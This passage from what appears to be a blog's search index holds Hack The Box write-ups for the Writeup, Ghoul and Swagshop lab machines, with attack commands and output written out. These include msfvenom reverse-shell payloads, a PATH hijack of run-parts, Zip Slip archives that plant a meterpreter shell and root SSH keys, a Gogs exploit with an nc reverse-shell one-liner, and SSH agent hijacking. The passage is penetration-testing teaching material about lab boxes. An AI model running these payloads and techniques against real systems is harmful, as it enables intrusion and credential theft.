Apr 19 04:11 sbindrwxrwsr-x 7 root staff  4096 Apr 19 04:30 sharedrwxrwsr-x 2 root staff  4096 Apr 19 04:11 srcHowever, I can’t see the contents of /usr/local/bin and /usr/local/sbin. This is not a standard Linux distro configuration so the box creator probably changed the permissions on purpose so HTB players can’t piggy-back on other players binaries.I copied pspy to the box and found a cronjob running every minute:I don’t have access to the content of the script but it’s safe to assume that it deletes files or folders somewhere on the system. I created a test file inside /usr/local/bin to see if the script would delete it. After a minute, I saw that the file was removed:jkr@writeup:/usr/local/bin$ echo test &gt; testjkr@writeup:/usr/local/bin$ cat testtestjkr@writeup:/usr/local/bin$ cat testtestjkr@writeup:/usr/local/bin$ cat testcat: test: No such file or directoryBecause we can write files into /usr/local/bin and /usr/local/sbin, we can potentially get RCE since the default path for users is the following:jkr@writeup:/usr/local/bin$ cat /etc/profile# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).if [ \"`id -u`\" -eq 0 ]; then  PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"else  PATH=\"/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\"/usr/local/bin and /usr/local/sbin are preferred over the other paths so it’s clear what we need to do here:  Find the filename of something that is executed by root (that filename must be executed without the full path)  Find the trigger for executing that command as rootI thought I could use grep or iptables but that didn’t work. I think it’s because the programs are executed by fail2ban which is started with a modified path as per /etc/init.d/fail2ban:PATH=/usr/sbin:/usr/bin:/sbin:/binI also noticed that the run-parts program is executed whenever I SSH in:  run-parts runs all the executable files named within constraints described below, found in directory  directory. Other files and directories are silently ignored.I can’t make run-parts run arbitrary binaries since I can’t write /etc/update-motd.d/ but because the program is run without the full path I can write my own run-parts binary to /usr/local/bin or /usr/local/sbin and it will be executed instead of the real one because the directory is located in front in the PATH variable definition.For the malicious binary, I use a standard linux reverse shell payload generated with Metasploit:# msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=10.10.14.7 LPORT=4444chmod +x ./shellI just need to upload the file to /usr/local/bin/run-parts and SSH in to trigger a callback and get root privileges."
  },
  
  {
    "title": "Ghoul - Hack The Box",
    "url": "/posts/htb-writeup-ghoul/",
    "categories": "hackthebox, infosec",
    "tags": "linux, zipslip, git, ssh, unintended, gogs, containers",
    "date": "2019-10-05 00:00:00 +0800",
    





    
    "snippet": "Ghoul was a tricky box from Minatow that required pivoting across 3 containers to find the bits and pieces needed to get root. To get a shell I used a Zip Slip vulnerability in the Java upload app ...",
    "content": "Ghoul was a tricky box from Minatow that required pivoting across 3 containers to find the bits and pieces needed to get root. To get a shell I used a Zip Slip vulnerability in the Java upload app to drop a PHP meterpreter payload on the webserver. After pivoting and scanning the other network segment I found a Gogs application server that is vulnerable and I was able to get a shell there. More credentials were hidden inside an archive file and I was able to use the root shell on one of the container to hijack the SSH agent socket from a connecting root user and hop onto the host OS.Summary  Guess the simple HTTP basic auth credentials for the tomcat web application running on port 8080  Exploit the Zip Slip vulnerability in the upload form to upload a meterpreter shell  Find SSH keys backups for 3 local users, one of them is encrypted but the password is found in the chat app screenshot  Find additional container hosts by uploading a statically compiled nmap binary  Identify cronjob of user logging onto one of the container and using the SSH agent  Find Gogs application running on another container and pop a shell using CVE-2018-18925 and CVE-2018-20303  Download 7zip archive containing a git repo and extract credentials from git reflogs  Log in as root to the container on which we found the SSH agent earlier and hijack the private keys of the connecting user to get root access on the hostTools/Blogs used  https://github.com/ptoomey3/evilarc  https://github.com/TheZ3ro/gogsownzPortscanA few observations based on the initial scan:  There are two sshd daemons running on this box and they’re both running a different version.  There are two webservers, one running Apache and the other one Tomcat# nmap -sC -sV -p- 10.10.10.101Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-06 15:00 EDTNmap scan report for ghoul.htb (10.10.10.101)Host is up (0.011s latency).Not shown: 65531 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Aogiri Tree2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1| http-auth:| HTTP/1.1 401 Unauthorized\\x0D|_  Basic realm=Aogiri|_http-server-header: Apache-Coyote/1.1|_http-title: Apache Tomcat/7.0.88 - Error reportService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWebsite enumeration on port 80The website is some kind of Tokyo Ghoul themed website with a homepage, blog and contact section.There’s a contact form so that could be a potential target for command injection or XSS:The contact form doesn’t work because it sends a POST /bat/MailHandler.php and that file doesn’t exist. This is probably safe to ignore for now.Like every box running a webserver, I’m running gobuster to see if I can find any hidden directories or files.# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -x php -u http://10.10.10.101[...]/archives (Status: 301)/css (Status: 301)/images (Status: 301)/js (Status: 301)/secret.php (Status: 200)/server-status (Status: 403)/uploads (Status: 301)/users (Status: 301)secret.php, /users and /uploads are interesting, but the later gives me a 403 Forbidden message.The secret.pnp is just an image of some kind of simulated chat application.I’ve highlighted above some possibles clues:  That fake flag/hash is obviously a troll  There’s a mention of an RCE, file service, and vsftp. I didn’t see FTP open during my portscan however.  IP logs, maybe useful for something else  X server, but I didn’t see that port open during the portscan  ILoveTouka could be a password or part of a password, I’ll keep that in mind for laterThe /users page shows a login page:I tried a couple of default logins and looked for SQL injections, no luck. I will need to find the credentials to get past the login page.Website enumeration on port 8080The website is protected with HTTP Basic Auth, but I guessed the admin/admin login right on the first try.Once authenticated, I find another website running on port 8080. It’s some generic company website.There’s also a contact form but it doesn’t seem to do anything except return some random message:The most interesting thing on this page are the two upload forms: One for images, and another one for Zip files.The image upload form checks that the file signature is a JPEG.If I try to upload any other file type I get the following error message.The same checks are enforced for ZIP files, here’s a successful upload for a ZIP file:And here’s the error when uploading another file type:So it seems I can only upload ZIP and JPG files and I don’t know where they are stored. I ran gobuster to try to find an upload folder or something on port 8080 but I didn’t find anything.Getting a shell with Zip SlipThere’s a well known arbitrary file overwrite vulnerability called Zip Slip that affects multiple projects, including Java. The gist of it is we can craft a malicious zip file  that when extracted will place the content to an arbitrary location of our choosing. Normally, using file traversal characters would be forbidden but the vulnerability here allow such characters to be processed by Java. In this case, we want to place a reverse shell payload somewhere on the webserver where we can access it and trigger it.Details on the vulnerability can be found here: https://github.com/snyk/zip-slip-vulnerabilityTo generate the zip files, I used the https://github.com/ptoomey3/evilarc python tool:# msfvenom -p php/meterpreter/reverse_tcp -o met.php LHOST=10.10.14.23 LPORT=4444[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload[-] No arch selected, selecting arch: php from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 1112 bytesSaved as: met.php# python evilarc.py -f met.zip -o unix -p \"../../../../../../var/www/html\" met.phpCreating met.zip containing ../../../../../../../../../../../../../../var/www/html/met.phpAfter creating the archive, I uploaded it then triggered the meterpreter payload by browsing to it /met.php[*] Started reverse TCP handler on 10.10.14.23:4444msf5 exploit(multi/handler) &gt; [*] Encoded stage with php/base64[*] Sending encoded stage (51106 bytes) to 10.10.10.101[*] Meterpreter session 1 opened (10.10.14.23:4444 -&gt; 10.10.10.101:46874) at 2019-05-06 21:41:05 -0400meterpreter &gt; shellProcess 1180 created.Channel 0 created.python -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@Aogiri:/var/www/html$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)Cool, I now have a shell but I can’t read any of the home directories:www-data@Aogiri:/var/backups/backups/keys$ ls -l /homels -l /hometotal 24drwx------ 1 Eto    Eto    4096 Dec 13 13:45 Etodrwx------ 1 kaneki kaneki 4096 Dec 13 13:45 kanekidrwx------ 1 noro   noro   4096 Dec 13 13:45 noroNext, I checked the /var/www/html directory for any useful data or credential in the website source files:login.php has hardcoded credentials:if(isset($_POST['Submit'])){/* Define username and associated password array */$logins = array('kaneki' =&gt; '123456','noro' =&gt; 'password123','admin' =&gt; 'abcdef');/usr/share/tomcat7/conf/tomcat-users.xml has some more credentials:&lt;!--&lt;user username=\"admin\" password=\"test@aogiri123\" roles=\"admin\" /&gt;  &lt;role rolename=\"admin\" /&gt;--&gt;Find SSH user keysAfter some enumeration I found interesting stuff in /var/backups/backups:www-data@Aogiri:/var/backups/backups$ ls -lals -latotal 3852drwxr-xr-x 1 root root    4096 Dec 13 13:45 .drwxr-xr-x 1 root root    4096 Dec 13 13:45 ..-rw-r--r-- 1 root root 3886432 Dec 13 13:45 Important.pdfdrwxr-xr-x 2 root root    4096 Dec 13 13:45 keys-rw-r--r-- 1 root root     112 Dec 13 13:45 note.txt-rw-r--r-- 1 root root   29380 Dec 13 13:45 sales.xlsxThe note is pretty useless:www-data@Aogiri:/var/backups/backups$ cat note.txtThe files from our remote server Ethereal will be saved here. I'll keep updating it overtime, so keep checking.But there are SSH keys backups for all three users:www-data@Aogiri:/var/backups/backups/keys$ ls -ltotal 12-rwxr--r-- 1 root root 1675 Dec 13 13:45 eto.backup-rwxr--r-- 1 root root 1766 Dec 13 13:45 kaneki.backup-rwxr--r-- 1 root root 1675 Dec 13 13:45 noro.backupwww-data@Aogiri:/var/backups/backups/keys$ file *.backupfile *.backupeto.backup:    PEM RSA private keykaneki.backup: PEM RSA private keynoro.backup:   PEM RSA private keyeto.backup and noro.backup are unencrypted, but kaneki.backup is encrypted:www-data@Aogiri:/var/backups/backups/keys$ cat kaneki.backup-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,9E9E4E88793BC9DB54A767FC0216491FI transfered all the files to my Kali VM, including the Important.pdf file but I couldn’t open it (corrupted or something).Logging as EtoNothing interesting with Eto:# ssh -i eto.backup Eto@10.10.10.101Eto@Aogiri:~$ lsalert.txtEto@Aogiri:~$ cat alert.txtHey Noro be sure to keep checking the humans for IP logs and chase those little shits down!Logging as noroNothing interesting either with noro:# ssh -i noro.backup noro@10.10.10.101noro@Aogiri:~$ lsto-do.txtnoro@Aogiri:~$ cat to-do.txtNeed to update backups.Logging as kanekiI found the password for the kaneki’s SSH private key is ILoveTouka as per the secret.php page found earlier:# ssh -i kaneki.backup kaneki@10.10.10.101Enter passphrase for key 'kaneki.backup':Last login: Sun Jan 20 12:33:33 2019 from 172.20.0.1kaneki@Aogiri:~$ lsnote.txt  notes  secret.jpg  user.txtkaneki@Aogiri:~$ cat note.txtVulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts.kaneki@Aogiri:~$ cat notesI've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc.DM me for the access.kaneki@Aogiri:~$ cat user.txt7c0f11...The secret.jpg file seems to be just a troll, I tried steghide, binwalk and other CTF stego tools and didn’t find any hidden information.I’m in a docker container, as per the .dockerenv file and the IP address 172.20.0.10:kaneki@Aogiri:/$ ls -latotal 116-rwxr-xr-x   1 root root    0 Dec 13 13:45 .dockerenvkaneki@Aogiri:/$ ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.20.0.10  netmask 255.255.0.0  broadcast 172.20.255.255        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)        RX packets 54446  bytes 6369464 (6.3 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 44912  bytes 56773469 (56.7 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0Getting access to kaneki-pcKaneki’s ssh directory contains two entries in the authorized_keys:kaneki@Aogiri:~/.ssh$ cat authorized_keysssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7T[...] kaneki_pub@kaneki-pcssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8f[...] kaneki@AogiriI noticed that there is a different username: kaneki_pubThere’s most likely another container running, I found it by uploading a statically compiled copy of nmap and scanning 172.20.0.0/16:kaneki@Aogiri:~$ ./nmap -sP 172.20.0.0/16Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-07 02:35 UTCCannot find nmap-payloads. UDP payloads are disabled.Nmap scan report for Aogiri (172.20.0.1)Host is up (0.00039s latency).Nmap scan report for Aogiri (172.20.0.10)Host is up (0.00027s latency).Nmap scan report for 64978af526b2.Aogiri (172.20.0.150)Host is up (0.00029s latency).So the other container is 172.20.0.150. I can log in using the kaneki_pub username and the same ILoveTouka password for the private key.kaneki@Aogiri:~$ ssh kaneki_pub@172.20.0.150Enter passphrase for key '/home/kaneki/.ssh/id_rsa':Last login: Tue May  7 00:04:35 2019 from 172.20.0.10kaneki_pub@kaneki-pc:~$ lsto-do.txtkaneki_pub@kaneki-pc:~$ cat to-do.txtGive AogiriTest user access to Eto for git.AogiriTest could be useful, let’s make note of it.Enumerating kaneki-pcThe kaneki-pc container has a leg on another network segment: 172.18.0.0/16kaneki_pub@kaneki-pc:~$ ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.20.0.150  netmask 255.255.0.0  broadcast 172.20.255.255eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.18.0.200  netmask 255.255.0.0  broadcast 172.18.255.255There’s also another user kaneki_adm on this machine, but I don’t have access to it:kaneki_adm:x:1001:1001::/home/kaneki_adm:/bin/bashkaneki_pub:x:1000:1002::/home/kaneki_pub:/bin/bashkaneki_pub@kaneki-pc:/home$ lskaneki_adm  kaneki_pubI saw that some user connected to the server with ssh-agent enabled:kaneki_pub@kaneki-pc:/home$ ls -l /tmptotal 16drwx------ 1 root       root       4096 Dec 16 07:36 ssh-1Oo5P5JuouKmdrwx------ 1 kaneki_adm kaneki_adm 4096 Dec 16 07:36 ssh-FWSgs7xBNwzUdrwx------ 1 kaneki_pub kaneki     4096 Dec 16 07:36 ssh-jDhFSu7EeAnz-rw------- 1 root       root        400 May  7 02:28 sshd-stderr---supervisor-22D6A5.log-rw------- 1 root       root          0 May  7 02:28 sshd-stdout---supervisor-0BpnC3.logThere seems to be a cron job from 172.20.0.1 that logs in with user kaneki_adm every 6 minutes.kaneki_pub@kaneki-pc:/home$ last -10kaneki_a pts/2        172.20.0.1       Tue May  7 02:42 - 02:42  (00:00)kaneki_p pts/1        172.20.0.10      Tue May  7 02:38    gone - no logoutkaneki_a pts/1        172.20.0.1       Tue May  7 02:36 - 02:36  (00:00)kaneki_a pts/1        172.20.0.1       Tue May  7 02:30 - 02:30  (00:00)kaneki_a pts/1        172.20.0.1       Sun Apr 28 14:12 - 14:12  (00:00)kaneki_a pts/1        172.20.0.1       Wed Apr 24 12:42 - 12:42  (00:00)kaneki_a pts/1        172.20.0.1       Sun Mar  3 06:18 - 06:18  (00:00)kaneki_a pts/1        172.20.0.1       Sun Mar  3 06:12 - 06:15  (00:02)kaneki_a pts/1        172.20.0.1       Tue Jan 22 17:12 - 17:12  (00:00)kaneki_a pts/1        172.20.0.1       Tue Jan 22 17:06 - 17:06  (00:00)wtmp begins Sat Dec 29 05:26:31 2018kaneki_pub@kaneki-pc:/home$ dateTue May  7 02:44:01 UTC 2019I uploaded Ippsec’s process monitor to watch for any cronjob or new processes created:#!/bin/bashIFS=$'\\n'old_process=$(ps -eo command)while true; do\tnew_process=$(ps -eo command)\tdiff &lt;(echo \"$old_process\") &lt;(echo \"$new_process\")\tsleep 1\told_process=$new_processdoneAfter a few minutes I caught the kaneki_adm user connecting to 172.18.0.1 as root:kaneki_pub@kaneki-pc:~$ ./procmon.sh7,9d6&lt; sshd: kaneki_adm [priv]&lt; sshd: kaneki_adm@pts/2&lt; ssh root@172.18.0.1 -p 2222 -t ./log.shIf I had root access on the container I could get access to the ssh agent socket and hijack the private key but I don’t have root yet.Next I scanned the subnet on that other network interface to see if I could find any other hosts there:kaneki_pub@kaneki-pc:~$ ./nmap -sP 172.18.0.0/16Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-07 03:08 GMTCannot find nmap-payloads. UDP payloads are disabled.Nmap scan report for Aogiri (172.18.0.1)Host is up (0.00082s latency).Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)Host is up (0.00068s latency).Nmap scan report for kaneki-pc (172.18.0.200)Host is up (0.00037s latency).[...]kaneki_pub@kaneki-pc:~$ ./nmap -p- 172.18.0.2Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-07 03:09 GMTUnable to find nmap-services!  Resorting to /etc/servicesCannot find nmap-payloads. UDP payloads are disabled.Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)Host is up (0.00020s latency).Not shown: 65533 closed portsPORT     STATE SERVICE22/tcp   open  ssh3000/tcp open  unknownI found 172.18.0.2 running both SSH and some other service on port 3000. At this point it’s probably a good idea to start setting up some port forwarding. With the following I can access port 3000 through a double hop:ssh -L 2222:172.20.0.150:22 -i root.key root@10.10.10.101ssh -i kaneki.backup -p 2222 -L 3000:172.18.0.2:3000 kaneki_pub@127.0.0.1Exploiting Gogs on the 3rd containerOn port 3000 we find a Gogs application running:The version is shown at the bottom of the page:I tried various credentials and was able to get with pieces of info I found earlier: AogiriTest / test@aogiri123There’s nothing on the Gogs application, no repo, nothing interesting.Next I did some research and found there’s two CVE’s for this version: CVE-2018-18925 and CVE-2018-20303. Gogs 0.11.66 allows remote code execution because it does not properly validate session IDs, as demonstrated by a “..” session-file forgery in the file session provider in file. The other CVE is a directory traversal in the file-upload functionality can allow an attacker to create a file under data/sessions on the server.There’s already a nice exploit available on Github: https://github.com/TheZ3ro/gogsownz# python3 gogsownz.py http://127.0.0.1:3000/ --burp -C \"AogiriTest:test@aogiri123\" -v --preauth --rce \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f\" --cleanup[!] Created Gogsownz[i] Starting Gogsownz on: http://127.0.0.1:3000[+] Loading Gogs homepage[i] Gogs Version installed: © 2018 Gogs Version: 0.11.66.0916[i] The Server is redirecting on the login page. Probably REQUIRE_SIGNIN_VIEW is enabled so you will need an account.[!] Creds found.[!] Logging in...[+] Performing login[+] Logged in sucessfully as AogiriTest[i] Exploiting pre-auth PrivEsc...[+] Uploading admin session as attachment file[+] Uploaded successfully, preparing cookies for the Path Traversal[+] Admin session hijacked, trying to login as admin[i] Signed in as kaneki, is admin True[i] Current session cookie: '../attachments/9/4/94918be1-7932-44b5-8490-40ff628acf8c'[+] Got UserID 1[+] Repository created sucessfully[+] Setting Git hooks[+] Git hooks set sucessfully[+] Fetching last commit...[+] Got last commit[+] Triggering the RCE with a new commitI popped a shell as user git:# nc -lvnp 4444Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::4444Ncat: Listening on 0.0.0.0:4444Ncat: Connection from 10.10.10.101.Ncat: Connection from 10.10.10.101:42515./bin/sh: can't access tty; job control turned off/data/git/gogs-repositories/kaneki/gogstest.git $ iduid=1000(git) gid=1000(git) groups=1000(git)I saved the kaneki public key to the git user folder in case I lose my shell:/data/git/.ssh $ echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@kaneki-pc\" &gt;&gt; authorized_keysThere’s not much git has access to, but I found an interesting  gosu suid binary:/data/git $ find / -perm /4000 2&gt;/dev/null[...]/usr/sbin/gosu/bin/suI can get root access by just running it:3713ea5e4353:~$ gosu root /bin/bash3713ea5e4353:/data/git# cd3713ea5e4353:~#The root user directory contains a 7zip archive and a session.sh file with some credentials.3713ea5e4353:~# lsaogiri-app.7z  session.sh3713ea5e4353:~# cat session.sh#!/bin/bashwhile truedo  sleep 300  rm -rf /data/gogs/data/sessions  sleep 2  curl -d 'user_name=kaneki&amp;password=12345ILoveTouka!!!' http://172.18.0.2:3000/user/logindoneThe session.sh logs in to the gogs application every 10 minuters as per the crontab.3713ea5e4353:~# crontab -l# do daily/weekly/monthly maintenance# min\thour\tday\tmonth\tweekday\tcommand*/15\t*\t*\t*\t*\trun-parts /etc/periodic/15min0\t*\t*\t*\t*\trun-parts /etc/periodic/hourly0\t2\t*\t*\t*\trun-parts /etc/periodic/daily0\t3\t*\t*\t6\trun-parts /etc/periodic/weekly0\t5\t1\t*\t*\trun-parts /etc/periodic/monthly*/10\t*\t*\t*\t*\t/root/session.shI grabbed the 7zip file and extracted it locally on my Kali VM. It contains the skeleton for a Java application and the git metadata.# ls -latotal 60drwxr-xr-x 5 root root  4096 May  6 12:28 .drwxr-xr-x 3 root root 12288 May  6 12:19 ..drwxr-xr-x 8 root root  4096 May  6 12:28 .git-rw-r--r-- 1 root root   268 May  6 12:28 .gitignoredrwxr-xr-x 3 root root  4096 Dec 29 01:36 .mvn-rwxr-xr-x 1 root root  9113 May  6 12:28 mvnw-rw-r--r-- 1 root root  5810 May  6 12:28 mvnw.cmd-rw-r--r-- 1 root root  1931 May  6 12:28 pom.xml-rw-r--r-- 1 root root   124 May  6 12:28 README.mddrwxr-xr-x 4 root root  4096 Dec 29 01:36 srcFirst thing I did was check the git commit log for any interesting data:# git logcommit e29ad435b1cf4d9e777223a133a5b0a9aaa20625 (HEAD -&gt; master)Author: kaneki &lt;kaneki@aogiri.htb&gt;Date:   Sat Dec 29 11:38:18 2018 +0530    added servicecommit b3752e00721b4b87c99ef58e3a54143061b20b99Author: kaneki &lt;kaneki@aogiri.htb&gt;Date:   Sat Dec 29 11:34:07 2018 +0530    noro stop doing stupid shitcommit 813e0a518064778343ba54b64e16ad44c19900fbAuthor: noro &lt;noro@aogiri.htb&gt;Date:   Sat Dec 29 11:31:26 2018 +0530    hello world!commit ed5a88cbbc084cba1c0954076a8d7f6f5ce0d64bAuthor: kaneki &lt;kaneki@aogiri.htb&gt;Date:   Sat Dec 29 11:24:41 2018 +0530    mysql supportcommit 51d2c360b13b37ad608361642bd86be2a4983789Author: kaneki &lt;kaneki@aogiri.htb&gt;Date:   Sat Dec 29 11:22:02 2018 +0530    added readmecommit bec96aaf334dc0110caa163e308d4e2fc2b8f133Author: kaneki &lt;kaneki@aogiri.htb&gt;Date:   Sat Dec 29 11:20:22 2018 +0530    updated dependenciescommit 8b7452057fc35b5bd81a0b26a4bd2fe1220ab667Author: kaneki &lt;kaneki@aogiri.htb&gt;Date:   Sat Dec 29 11:15:14 2018 +0530    update readmeCommit b3752e00721b4b87c99ef58e3a54143061b20b99 seems interesting since kaneki is cleaning up Noro’s mess:# git show b3752e00721b4b87c99ef58e3a54143061b20b99commit b3752e00721b4b87c99ef58e3a54143061b20b99[...] spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db-spring.datasource.username=root-spring.datasource.password=root+spring.datasource.username=kaneki+spring.datasource.password=jT7Hr$.[nF.)c)4C server.address=0.0.0.0Ahah! Found some root password here. Of course, nothing’s listening on port 3306 on any of the container but maybe I can use the root password on the kaneki-pc container:kaneki_pub@kaneki-pc:~$ suPassword:su: Authentication failureNope… Let’s keep looking.Checking the git reflogs, I see the following:# git reflog647c5f1 (HEAD -&gt; master, origin/master) HEAD@{0}: commit: changed serviceb43757d HEAD@{1}: commit: added mysql depsb3752e0 HEAD@{2}: reset: moving to b3752e00d426b5 HEAD@{3}: reset: moving to 0d426b5e29ad43 HEAD@{4}: reset: moving to HEAD^0d426b5 HEAD@{5}: reset: moving to HEAD0d426b5 HEAD@{6}: reset: moving to origin/master0d426b5 HEAD@{7}: commit: update dependenciese29ad43 HEAD@{8}: commit: added serviceb3752e0 HEAD@{9}: commit: noro stop doing stupid shit813e0a5 HEAD@{10}: commit: hello world!ed5a88c HEAD@{11}: commit: mysql support51d2c36 HEAD@{12}: commit: added readmebec96aa HEAD@{13}: commit: updated dependencies8b74520 HEAD@{14}: commit (initial): update readmeI diff’ed every commit and different password for the database: 7^Grc%C\\7xEQ?tb4# git diff HEAD@{4}[...]-spring.datasource.url=jdbc:mysql://localhost:3306/db+spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db spring.datasource.username=kaneki-spring.datasource.password=7^Grc%C\\7xEQ?tb4+spring.datasource.password=jT7Hr$.[nF.)c)4C server.address=0.0.0.0Root access through SSH agent hijackThe new found password works to get root access on the kaneki-pc container:kaneki_pub@kaneki-pc:~$ su -l rootPassword:root@kaneki-pc:~# iduid=0(root) gid=0(root) groups=0(root)root@kaneki-pc:~# lsroot.txtroot@kaneki-pc:~# cat root.txtYou've done well to come upto here human. But what you seek doesn't lie here. The journey isn't over yet.....As expected, I don’t have access to the real root.txt flag on this one.Earlier I found that a user connects remotely then back using root’s account on the host. I can just wait until the next time it connects then hijack its ssh agent socket:root@kaneki-pc:/tmp# ls -ltotal 20drwx------ 1 root       root       4096 Dec 16 07:36 ssh-1Oo5P5JuouKmdrwx------ 1 kaneki_adm kaneki_adm 4096 Dec 16 07:36 ssh-FWSgs7xBNwzUdrwx------ 2 kaneki_adm kaneki_adm 4096 May  8 02:00 ssh-Y2CJdynAyJdrwx------ 1 kaneki_pub kaneki     4096 Dec 16 07:36 ssh-jDhFSu7EeAnz-rw------- 1 root       root        400 May  8 01:16 sshd-stderr---supervisor-b_s4zO.log-rw------- 1 root       root          0 May  8 01:16 sshd-stdout---supervisor-rrVo6W.logroot@kaneki-pc:/tmp# cd ssh-Y2CJdynAyJroot@kaneki-pc:/tmp/ssh-Y2CJdynAyJ# ls -ltotal 0srwxr-xr-x 1 kaneki_adm kaneki_adm 0 May  8 02:00 agent.216root@kaneki-pc:/tmp/ssh-Y2CJdynAyJ# export SSH_AUTH_SOCK=agent.216root@kaneki-pc:/tmp/ssh-Y2CJdynAyJ# ssh -p 2222 172.18.0.1Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-45-generic x86_64)[...]Last login: Tue May  7 19:00:02 2019 from 172.18.0.200root@Aogiri:~# iduid=0(root) gid=0(root) groups=0(root)root@Aogiri:~# lslog.sh  root.txtroot@Aogiri:~# cat root.txt7c0f11...Unintended way to root on Aogiri containerInstead of using the SSH keys found in the backups directory I can use the Zip Slip vulnerability to upload my own SSH publicy key to the root directory’s SSH folder.# cp /root/.ssh/id_rsa.pub authorized_keys# python evilarc.py -f root.zip -o unix -p \"../../../../../../root/.ssh\" authorized_keysCreating root.zip containing ../../../../../../../../../../../../../../root/.ssh/authorized_keys# curl -u admin:admin -F 'data=@root.zip' http://10.10.10.101:8080/uploadI can now log in as root:# ssh 10.10.10.101Last login: Tue May  7 00:06:28 2019 from 172.20.0.1root@Aogiri:~# iduid=0(root) gid=0(root) groups=0(root)"
  },
  
  {
    "title": "Swagshop - Hack The Box",
    "url": "/posts/htb-writeup-swagshop/",
    "categories": "hackthebox, infosec",
    "tags": "linux, magento, vi, sudo",
    "date": "2019-09-28 00:00:00 +0800",
    





    
    "snippet": "SwagShop is one of those easy boxes where you can pop a shell just by using public exploits. It’s running a vulnerable Magento CMS on which we can create an admin using an exploit then use another ...",
    "content": "SwagShop is one of those easy boxes where you can pop a shell just by using public exploits. It’s running a vulnerable Magento CMS on which we can create an admin using an exploit then use another one to get RCE. To privesc I can run vi as root through sudo and I use a builtin functionality of vi that allows users to execute commands from vi so I can get root shell.Summary  A Vulnerable Magento CMS 1.9.0 instance is running and we can use a CVE to create an admin account  We then use another exploit to get RCE and a shell on the box  vi is in the sudoers file for www-data and we can execute a shell as root from withing vi with :!/bin/shTools/Blogs used  Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution  Magento eCommerce - Remote Code ExecutionDetailed stepsPortscan# nmap -sC -sV -p- 10.10.10.140Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-11 20:52 EDTNmap scan report for swagshop.htb (10.10.10.140)Host is up (0.011s latency).Not shown: 65533 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Did not follow redirect to http://10.10.10.140/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWebsite enumerationThe website 